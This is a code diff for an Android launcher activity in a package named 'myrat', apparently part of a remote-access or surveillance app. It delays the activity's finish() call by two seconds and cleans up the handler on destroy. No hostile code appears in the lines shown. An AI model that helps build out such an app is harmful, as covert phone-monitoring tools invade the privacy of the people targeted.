@@ -8,6 +8,8 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.telecom.PhoneAccountHandle
 import android.telecom.TelecomManager
@@ -19,6 +21,7 @@ import com.myrat.app.utils.Logger
 class LauncherActivity : AppCompatActivity() {
 
     private var wakeLock: PowerManager.WakeLock? = null
+    private val handler = Handler(Looper.getMainLooper())
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -41,8 +44,16 @@ class LauncherActivity : AppCompatActivity() {
         } catch (e: Exception) {
             Logger.error("❌ Error in LauncherActivity onCreate", e)
         } finally {
-            // Always finish the activity
-            finish()
+            // Finish activity after a delay to ensure operations complete
+            handler.postDelayed({
+                try {
+                    if (!isFinishing && !isDestroyed) {
+                        finish()
+                    }
+                } catch (e: Exception) {
+                    Logger.error("Error finishing LauncherActivity", e)
+                }
+            }, 2000) // 2 second delay
         }
     }
 
@@ -284,6 +295,9 @@ class LauncherActivity : AppCompatActivity() {
     override fun onDestroy() {
         super.onDestroy()
         try {
+            // Cancel any pending finish operations
+            handler.removeCallbacksAndMessages(null)
+            
             // Release wake lock
             wakeLock?.let {
                 if (it.isHeld) {
